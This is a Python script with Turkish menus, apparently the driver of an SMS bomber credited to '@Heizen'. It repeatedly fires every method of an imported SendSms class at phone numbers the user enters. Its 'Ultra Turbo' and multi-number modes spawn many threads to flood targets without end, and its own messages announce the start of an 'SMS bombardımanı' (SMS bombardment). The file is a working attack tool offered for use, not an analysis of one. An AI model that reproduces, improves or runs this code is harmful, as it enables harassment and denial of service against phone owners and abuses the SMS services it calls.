from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
import threading
import sys
import signal

# CTRL+C ile programın düzgün kapatılması için
def signal_handler(sig, frame):
    print(f"\n{Fore.LIGHTRED_EX}Program kapatılıyor...{Style.RESET_ALL}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)

            
while 1:
    system("cls||clear")
    print("""{}
     _    _  ______ _____ __________ _   _ 
    | |  | ||  ____|_   _|___  / ___| \ | |
    | |__| || |__    | |    / / |__ |  \| |
    |  __  ||  __|   | |   / /|  __|| . ` |
    | |  | || |____ _| |_ / /_| |___| |\  |
    |_|  |_||______|_____/____\_____|_| \_|
                                          
                                          
    
    Sms: {}           {}by {}@Heizen\n  
    """.format(Fore.LIGHTCYAN_EX, len(servisler_sms), Style.RESET_ALL, Fore.LIGHTRED_EX))
    try:
        menu = (input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder (Normal)\n\n 2- SMS Gönder (Tek Numara - Ultra Turbo)\n\n 3- SMS Gönder (Çoklu Numara - Turbo)\n\n 4- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    
    if menu == 1:
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            print(Fore.LIGHTYELLOW_EX + "Numaraları aralarında boşluk bırakarak yazınız: "+ Fore.LIGHTGREEN_EX, end="")
            numaralar = input()
            tel_liste = [num.strip() for num in numaralar.split() if len(num.strip()) == 10]
            if not tel_liste:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Geçerli numara bulunamadı. Tekrar deneyiniz.")
                sleep(3)
                continue
            sonsuz = ""
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
            except ValueError:
                system("cls||clear")
                print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: "+ Fore.LIGHTGREEN_EX, end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms."+attribute+"()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                    while sms.adet < kere:
                        for attribute in dir(SendSms):
                            attribute_value = getattr(SendSms, attribute)
                            if callable(attribute_value):
                                if attribute.startswith('__') == False:
                                    if sms.adet == kere:
                                        break
                                    exec("sms."+attribute+"()")
                                    sleep(aralik)
        print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
        input()
        
    elif menu == 2:
        # TEK NUMARA - ULTRA TURBO MOD
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
            sleep(3)
            continue
            
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
            
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Ultra Turbo Güç (10-50 arası önerilir): "+ Fore.LIGHTGREEN_EX, end="")
            thread_guc = input() 
            thread_guc = int(thread_guc) if thread_guc else 15
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Varsayılan değer (15) kullanılacak.")
            thread_guc = 15
            sleep(3)
            
        system("cls||clear")
        print(Fore.LIGHTCYAN_EX + f"ULTRA TURBO MOD AKTIF: {tel_no} numarası için SMS bombardımanı başlatıldı!" + Style.RESET_ALL)
        print(Fore.LIGHTYELLOW_EX + "Programı durdurmak için Ctrl+C tuşuna basın..." + Style.RESET_ALL)
        print("\n")
        
        # Ölü thread'leri temizleme işlevi
        def temizle_thread_havuzu(havuz):
            return [t for t in havuz if t.is_alive()]
        
        # Ultra turbo SMS gönderme fonksiyonu
        def ultra_turbo_gonder(tel_no, mail):
            send_sms = SendSms(tel_no, mail)
            while True:
                thread_pool = []
                for fonk in servisler_sms:
                    for _ in range(3):  # Her servis için birden fazla thread
                        t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                        thread_pool.append(t)
                        t.start()
                
                # Thread'lerin tamamlanmasını beklemeden devam et
                # Bu daha hızlı SMS gönderimi sağlar
                sleep(0.1)  # Küçük bir bekleme ekleyelim CPU yükünü azaltmak için
        
        # Ana ultra turbo işlemi
        turbo_thread_havuzu = []
        try:
            for _ in range(thread_guc):
                t = threading.Thread(target=ultra_turbo_gonder, args=(tel_no, mail), daemon=True)
                turbo_thread_havuzu.append(t)
                t.start()
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Ultra Turbo thread başlatıldı!")
            
            # Her servis için thread havuzu yönetimi
            aktif_servisler = 0
            while True:
                # Aktif servis sayacını göster
                aktif_servisler = len([t for t in turbo_thread_havuzu if t.is_alive()])
                print(f"{Fore.LIGHTYELLOW_EX}[*] {Style.RESET_ALL}Aktif Turbo İşlem: {aktif_servisler}", end="\r")
                
                # Thread havuzunu temizle ve eksik olanları tamamla
                if aktif_servisler < thread_guc:
                    turbo_thread_havuzu = temizle_thread_havuzu(turbo_thread_havuzu)
                    kalan = thread_guc - len(turbo_thread_havuzu)
                    for _ in range(kalan):
                        t = threading.Thread(target=ultra_turbo_gonder, args=(tel_no, mail), daemon=True)
                        turbo_thread_havuzu.append(t)
                        t.start()
                
                sleep(1)  # CPU yükünü azaltmak için kısa bekleme
        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTRED_EX}İşlem durduruluyor...{Style.RESET_ALL}")
            sleep(2)
                
    elif menu == 3:
        # ÇOKLU NUMARA - TURBO MOD
        system("cls||clear")
        print(Fore.LIGHTYELLOW_EX + "Telefon numaralarını aralarında boşluk bırakarak yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        numaralar = input()
        tel_liste = [num.strip() for num in numaralar.split() if len(num.strip()) == 10]
        
        if not tel_liste:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Geçerli numara bulunamadı. Tekrar deneyiniz.")
            sleep(3)
            continue
            
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
            
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Her numara için tekrar sayısı (Daha fazla = daha hızlı): "+ Fore.LIGHTGREEN_EX, end="")
            tekrar = input()
            if tekrar:
                tekrar = int(tekrar)
            else:
                tekrar = 3
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Varsayılan değer (3) kullanılacak.")
            tekrar = 3
            sleep(3)
            
        system("cls||clear")
        print(Fore.LIGHTCYAN_EX + f"ÇOKLU TURBO MOD AKTIF: {len(tel_liste)} numara için SMS bombardımanı başlatıldı!" + Style.RESET_ALL)
        print(Fore.LIGHTYELLOW_EX + "Programı durdurmak için Ctrl+C tuşuna basın..." + Style.RESET_ALL)
        print("\n")
        
        # Turbo SMS gönderme fonksiyonu - hiç durmadan çalışacak şekilde
        def turbo_gonder(tel_no, mail):
            send_sms = SendSms(tel_no, mail)
            while True:
                try:
                    thread_pool = []
                    for fonk in servisler_sms:
                        t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                        thread_pool.append(t)
                        t.start()
                    
                    # Thread'lerin tamamlanmasını bekle ve başarılı SMS sayısını raporla
                    for t in thread_pool:
                        t.join(timeout=3)  # Timeout ekleyerek takılma sorununu çöz
                        
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}{tel_no} → {send_sms.adet} SMS gönderildi")
                except:
                    continue
        
        # Her numara için thread başlat
        turbo_threads = []
        try:
            for tel in tel_liste:
                for _ in range(tekrar):
                    t = threading.Thread(target=turbo_gonder, args=(tel, mail), daemon=True)
                    turbo_threads.append(t)
                    t.start()
                    print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Turbo thread başlatıldı: {tel}")
            
            # Ana thread'in çalışmaya devam etmesi için sonsuz döngü
            while True:
                print(f"{Fore.LIGHTYELLOW_EX}[*] {Style.RESET_ALL}Aktif: {len(tel_liste)} numara - İptal etmek için Ctrl+C", end="\r")
                sleep(1)
        except KeyboardInterrupt:
            print(f"\n{Fore.LIGHTRED_EX}İşlem durduruluyor...{Style.RESET_ALL}")
            sleep(2)
    
    elif menu == 4:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        sys.exit(0)
    else:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı seçim yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue